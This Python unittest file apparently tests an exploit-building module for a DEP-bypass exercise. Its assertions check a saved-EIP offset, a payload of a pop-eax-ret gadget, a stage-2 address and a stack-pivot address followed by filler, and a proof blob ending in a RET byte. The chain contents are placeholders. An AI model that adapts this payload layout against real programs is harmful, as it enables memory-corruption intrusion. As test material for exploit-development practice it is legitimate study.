from __future__ import annotations

import unittest
from struct import pack

from dep2_layout import (
    build_staged_payload,
    build_status_proof,
    first_stage_prefix_length,
)


class Dep2LayoutTests(unittest.TestCase):
    def test_first_stage_prefix_includes_saved_eip_and_two_dwords(self) -> None:
        self.assertEqual(first_stage_prefix_length(268), 280)

    def test_staged_payload_uses_only_three_controlled_initial_dwords(self) -> None:
        payload = build_staged_payload(
            saved_eip_offset=8,
            pop_eax_ret=0x62501002,
            stage2_address=0x62504100,
            pivot=0x62501014,
            stage2_offset=32,
            stage2=b"CHAIN",
            proof=b"PROOF",
        )

        self.assertEqual(
            payload[8:20],
            pack("<III", 0x62501002, 0x62504100, 0x62501014),
        )
        self.assertEqual(payload[20:32], b"A" * 12)
        self.assertEqual(payload[32:], b"CHAINPROOF")

    def test_status_proof_embeds_only_the_supplied_local_witness_values(self) -> None:
        proof = build_status_proof(0x62505000, 0x1337C0DE)

        self.assertIn(pack("<I", 0x62505000), proof)
        self.assertIn(pack("<I", 0x1337C0DE), proof)
        self.assertEqual(proof[-1:], b"\xC3")


if __name__ == "__main__":
    unittest.main()
